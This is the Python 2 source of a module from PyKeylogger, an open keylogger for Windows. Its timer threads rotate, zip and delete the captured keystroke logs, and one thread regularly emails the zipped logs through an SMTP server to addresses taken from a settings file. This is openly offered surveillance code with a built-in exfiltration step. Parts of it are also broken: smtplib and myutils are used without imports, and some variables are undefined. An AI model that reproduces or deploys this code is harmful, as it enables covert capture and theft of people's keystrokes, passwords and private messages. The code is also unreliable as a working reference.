##############################################################################
##
## PyKeylogger: Simple Python Keylogger for Windows
## Copyright (C) 2009  nanotube@users.sf.net
##
## http://pykeylogger.sourceforge.net/
##
## This program is free software; you can redistribute it and/or
## modify it under the terms of the GNU General Public License
## as published by the Free Software Foundation; either version 3
## of the License, or (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program.  If not, see <http://www.gnu.org/licenses/>.
##
##############################################################################

from threading import Thread, Event
import logging
import time
import re
import sys
import os.path
from myutils import _settings, _cmdoptions
import copy
import zipfile

# python 2.5 does some email things differently from python 2.4 and py2exe doesn't like it. 
# hence, the version check.
if sys.version_info[0] == 2 and sys.version_info[1] >= 5:
    from email.mime.multipart import MIMEMultipart 
    from email.mime.base import MIMEBase 
    from email.mime.text import MIMEText 
    from email.utils import COMMASPACE, formatdate 
    import email.encoders as Encoders
    
    #need these to work around py2exe
    import email.generator
    import email.iterators
    import email.utils
    import email.base64mime 
    
if sys.version_info[0] == 2 and sys.version_info[1] < 5:
    # these are for python 2.4 - they don't play nice with python 2.5 + py2exe.
    from email.MIMEMultipart import MIMEMultipart
    from email.MIMEBase import MIMEBase
    from email.MIMEText import MIMEText
    from email.Utils import COMMASPACE, formatdate
    from email import Encoders


class BaseTimerClass(Thread):
    '''This is the base class for timer (delay) based threads.
    
    Timer-based threads are ones that do not need to be looking at
    keyboard-mouse events to do their job.
    '''
    def __init__(self, dir_lock, loggername, *args, **kwargs):
        Thread.__init__(self)
        self.finished = Event()
        self.dir_lock = dir_lock
        self.loggername = loggername
        self.args = args # arguments, if any, to pass to task_function
        self.kwargs = kwargs # keyword args, if any, to pass to task_function
        
        self.settings = _settings['settings']
        self.cmdoptions = _cmdoptions['cmdoptions']
        
        # set this up for clarity
        self.subsettings = self.settings[loggername]
        
        # set these up here because we will usually need them.
        self.logger = logging.getLogger(self.loggername)
        self.logfile_path = self.logger.handlers[0].stream.name
        self.log_full_dir = os.path.dirname(self.logfile_path)
        self.log_rel_dir = os.path.basename(self.log_full_dir)
        self.logfile_name = os.path.basename(self.logfile_path)
        
        self.interval = None # set this in derived class
        
    def cancel(self):
        '''Stop the iteration'''
        self.finished.set()
    
    def task_function(self):
        '''to be overridden by derived classes'''
        pass
    
    def run(self):
        while not self.finished.isSet():
            self.finished.wait(self.interval)
            if not self.finished.isSet():
                self.task_function(*self.args, **self.kwargs)
                
        
class LogRotator(BaseTimerClass):
    '''This rotates the logfiles for the specified logger.
    
    This is also one of the simplest time-based worker threads, so would
    serve as a good example if you want to write your own.
    '''
    
    def __init__(self, *args, **kwargs):
        BaseTimerClass.__init__(self, *args, **kwargs)
        
        self.interval = \
            float(self.subsettings['Log Rotation']['Log Rotation Interval'])*60*60
        
        self.task_function = self.rotate_logs
    
    def rotate_logs(self):
        
        for handler in self.logger.handlers:
            self.dir_lock.acquire()
            try:
                handler.doRollover()
            except AttributeError:
                logging.getLogger('').debug("Logger %s, handler %r, "
                    "is not capable of rollover." % (loggername, handler))
            finally:
                self.dir_lock.release()

        
class LogFlusher(BaseTimerClass):
    '''Flushes the logfile write buffers to disk for the specified loggers.'''
    def __init__(self, *args, **kwargs):
        BaseTimerClass.__init__(self, *args, **kwargs)
        
        self.interval = float(self.subsettings['Log Flush']['Flush Interval'])
        
        self.task_function = self.flush_log_write_buffer
    
    def flush_log_write_buffer(self):
        '''Flushes all relevant log buffers.'''
        
        self.logger.debug("Logger %s: flushing file write buffers." % \
                            self.loggername)
        for handler in self.logger.handlers:
            self.dir_lock.acquire()
            try:
                handler.flush()
            finally:
                self.dir_lock.release()

class OldLogDeleter(BaseTimerClass):
    '''Deletes old logs.
    
    Walks the log directory tree and removes old logfiles.

    Age of logs to delete is specified in .ini file settings.
    '''
    def __init__(self, *args, **kwargs):
        BaseTimerClass.__init__(self, *args, **kwargs)
        
        self.interval = \
            float(self.subsettings['Old Log Deletion']['Age Check Interval'])*60*60
        
        self.task_function = self.delete_old_logs
        
        self.max_log_age = \
            float(self.subsettings['Old Log Deletion']['Max Log Age'])*24*60*60
        
    def delete_old_logs(self):
                
        self.dir_lock.acquire()
        try:
            for fname in os.listdir(self.log_full_dir):
                if self.needs_deleting(fname):
                    try:
                        filepath = os.path.join(self.log_full_dir, fname)
                        os.remove(filepath)
                    except:
                        logging.getLogger('').debug("Error deleting old log "
                        "file: %s" % filepath)
        finally:
            self.dir_lock.release()
    
    def needs_deleting(self, filename):
        filepath = os.path.join(self.log_full_dir, filename)
        if not filename.startswith('_internal_') and \
                time.time() - os.path.getmtime(filepath) > self.max_log_age:
            return True
        else:
            return False

class LogZipper(BaseTimerClass):
    '''Zip up log files for the specified logger.
    
    If rotator is enabled, just zip the rotated files.
    
    Otherwise, rotate, then zip.'''
    
    def __init__(self, *args, **kwargs):
        BaseTimerClass.__init__(self, *args, **kwargs)
        
        self.interval = float(self.subsettings['Zip']['Zip Interval'])*60*60
        
        self.task_function = self.zip_logs
    
    def zip_logs(self):
        '''Zip the rotated log files.
        
        Zip files are named as <time>.<logfilename>.zip and placed in the
        appropriate log subdirectory.
        
        Delete rotated log files which are zipped.
        '''
        
        if not self.subsettings['Log Rotation']['Log Rotation Enable']:
            lr = LogRotator(self.dir_lock, self.loggername)
            lr.rotate_logs()
            
        zipfile_name = ("%s." + self.logfile_name + ".zip") % \
                time.strftime("%Y%m%d_%H%M%S")
        zipfile_rel_path = os.path.join(self.log_rel_dir, zipfile_name)
        
        self.dir_lock.acquire()
        try:
            myzip = zipfile.ZipFile(zipfile_rel_path, "w", 
                                    zipfile.ZIP_DEFLATED)
            
            filelist = os.listdir(self.log_rel_dir)
            # will contain all files just zipped, and thus to be deleted
            filelist_copy = copy.deepcopy(filelist)
            for fname in filelist:
                if self.needs_zipping(fname):
                    myzip.write(os.path.join(self.log_rel_dir, fname))
                else: 
                    filelist_copy.remove(fname)
                            
            myzip.close()
            
            myzip = zipfile.ZipFile(zipfile_rel_path, "r", 
                                    zipfile.ZIP_DEFLATED)
            if myzip.testzip() != None:
                logging.getLogger('').debug("Warning: zipfile for logger %s "
                        "did not pass integrity test.\n" % self.loggername)
            else:
                # if zip checks out, delete files just added to zip.
                for fname in filelist_copy:
                    os.remove(os.path.join(self.log_rel_dir, fname))
            myzip.close()
            
            # write the name of the last completed zip file
            # so that we can check against this when emailing or ftping, 
            # to make sure we do not try to transfer a zipfile which is
            # in the process of being created
            ziplog=open(os.path.join(self.log_full_dir, 
                                        "_internal_ziplog.txt"), 'w')
            ziplog.write(zipfile_name)
            ziplog.close()
        finally:
            self.dir_lock.release()
    
    def needs_zipping(self, fname):
        '''Decide if file should go into the zip.
        
        Don't want to zip other zips, internal control files, or the log
        file currently being written to. More simply stated, we only want
        to zip rotated log files.
        '''
        if fname.endswith('.zip') or fname.startswith('_internal_') or \
                not re.match(r'\d{8}_\d{6}\.', fname):
            return False
        else:
            return True

class EmailLogSender(BaseTimerClass):
    '''Send log files by email to address[es] specified in .ini file.
    
    If log zipper is not enabled, we call a zipper here. 
    
    Otherwise, we just email out all the zips for the specified logger.
    '''
    
    def __init__(self, *args, **kwargs):
        BaseTimerClass.__init__(self, *args, **kwargs)
        
        self.interval = float(self.subsettings['E-mail']['E-mail Interval'])*60*60
        
        self.task_function = self.send_email

    def send_email(self):
        '''Zip and send logfiles by email for the specified logger.
        
        We use the email settings specified in the .ini file for the logger.
        '''

        if self.subsettings['Zip']['Enable Zip'] == False:
            lz = LogZipper(self.dir_lock, self.loggername)
            lz.zip_logs()
        
        try:
            ziplog = open(os.path.join(self.log_full_dir, "_internal_ziplog.txt"), 'r')
            self.latest_zip_file = ziplog.readline()
            ziplog.close()
        except:
            logging.getLogger('').debug("Unexpected error opening "
                    "_internal_ziplog.txt", sys.exc_info())
            return

        try:
            self.latest_zip_emailed = "" #in case emaillog doesn't exist.
            emaillog = open(os.path.join(self.log_full_dir, 
                    "_internal_emaillog.txt"), 'r')
            self.latest_zip_emailed = emaillog.readline()
            emaillog.close()
        except:
            logging.getLogger('').debug("Cannot open _internal_emaillog.txt. "
                    "Will email all available zip files.", exc_info=True)
        
        self.dir_lock.acquire()
        try:
            zipfile_list = os.listdir(self.log_full_dir)
            # removing elements from a list while iterating over it produces 
            # undesirable results so we make a copy
            zipfile_list_copy = copy.deepcopy(zipfile_list)
            logging.getLogger('').debug(str(zipfile_list))
            if len(zipfile_list) > 0:
                
                for filename in zipfile_list_copy:
                    if not self.needs_emailing(filename):
                        zipfile_list.remove(filename)
                        logging.getLogger('').debug("removing %s from "
                            "zipfilelist." % filename)
            
            logging.getLogger('').debug(str(zipfile_list))

            # set up the message
            msg = MIMEMultipart()
            msg['From'] = self.subsettings['E-mail']['E-mail From']
            msg['To'] = COMMASPACE.join(self.subsettings['E-mail']['E-mail To'].split(";"))
            msg['Date'] = formatdate(localtime=True)
            msg['Subject'] = self.subsettings['E-mail']['E-mail Subject']

            msg.attach(MIMEText(self.subsettings['E-mail']['E-mail Message Body']))

            if len(zipfile_list) == 0:
                msg.attach(MIMEText("No new logs present."))

            if len(zipfile_list) > 0:
                for fname in zipfile_list:
                    part = MIMEBase('application', "octet-stream")
                    part.set_payload(open(os.path.join(self.log_full_dir, fname),"rb").read())
                    Encoders.encode_base64(part)
                    part.add_header('Content-Disposition', 
                            'attachment; filename="%s"' % os.path.basename(file))
                    msg.attach(part)
        finally:
            self.dir_lock.release()
            
        # set up the server and send the message
        # wrap it all in a try/except, so that everything doesn't hang up
        # in case of network problems and whatnot.
        try:
            mysmtp = smtplib.SMTP(self.subsettings['E-mail']['SMTP Server'], 
                                    self.subsettings['E-mail']['SMTP Port'])
            
            if _cmdoptions.debug: 
                mysmtp.set_debuglevel(1)
            if self.subsettings['E-mail']['SMTP Use TLS'] == True:
                # we find that we need to use two ehlos (one before and one after starttls)
                # otherwise we get "SMTPException: SMTP AUTH extension not supported by server"
                # thanks for this solution go to http://forums.belution.com/en/python/000/009/17.shtml
                mysmtp.ehlo()
                mysmtp.starttls()
                mysmtp.ehlo()
            if self.subsettings['E-mail']['SMTP Needs Login'] == True:
                mysmtp.login(self.subsettings['E-mail']['SMTP Username'], 
                        myutils.password_recover(self.subsettings['E-mail']['SMTP Password']))
            sendingresults = mysmtp.sendmail(self.subsettings['E-mail']['E-mail From'], 
                    self.subsettings['E-mail']['E-mail To'].split(";"), msg.as_string())
            logging.getLogger('').debug("Email sending errors (if any): "
                    "%s \n" % str(sendingresults))
            
            # need to put the quit in a try, since TLS connections may error 
            # out due to bad implementation with 
            # socket.sslerror: (8, 'EOF occurred in violation of protocol')
            # Most SSL servers and clients (primarily HTTP, but some SMTP 
            # as well) are broken in this regard: 
            # they do not properly negotiate TLS connection shutdown. 
            # This error is otherwise harmless.
            # reference URLs:
            # http://groups.google.de/group/comp.lang.python/msg/252b421a7d9ff037
            # http://mail.python.org/pipermail/python-list/2005-August/338280.html
            try:
                mysmtp.quit()
            except:
                pass
            
            # write the latest emailed zip to log for the future
            if len(zipfile_list) > 0:
                zipfile_list.sort()
                emaillog = open(os.path.join(self.log_full_dir, 
                        "_internal_emaillog.txt"), 'w')
                emaillog.write(zipfile_list.pop())
                emaillog.close()
        except:
            logging.getLogger('').debug('Error sending email.', exc_info=True)
            pass # better luck next time

    def needs_emailing(self, fname):
        if fname.endswith('.zip') and fname <= self.latest_zip_file and \
                fname > self.latest_zip_emailed:
            return True
        else:
            return False
            
        
if __name__ == '__main__':
    # some basic testing code
    class TestTimerClass(BaseTimerClass):
        def __init__(self, *args, **kwargs):
            BaseTimerClass.__init__(self, *args, **kwargs)
            self.interval = 1
            
            self.task_function = self.print_hello
        
        def print_hello(self, name='bob', *args):
            print "hello, %s" % name
            print args
    
    _settings = {'settings':{'loggername':'bla'}}
    _cmdoptions = {'cmdoptions':'bla'}
    
    logger = logging.getLogger('loggername')
    logpath = '/tmp/throwaway.txt'
    from myutils import OnDemandRotatingFileHandler
    loghandler = OnDemandRotatingFileHandler(logpath)
    loghandler.setLevel(logging.INFO)
    logformatter = logging.Formatter('%(message)s')
    loghandler.setFormatter(logformatter)
    logger.addHandler(loghandler)
    
    ttc = TestTimerClass('dirlock','loggername','even more stuff', 'myname', 'some other name')
    ttc.start()
    time.sleep(5)
    ttc.cancel()

    ttc = TestTimerClass('dirlock','loggername')
    ttc.start()
    time.sleep(5)
    ttc.cancel()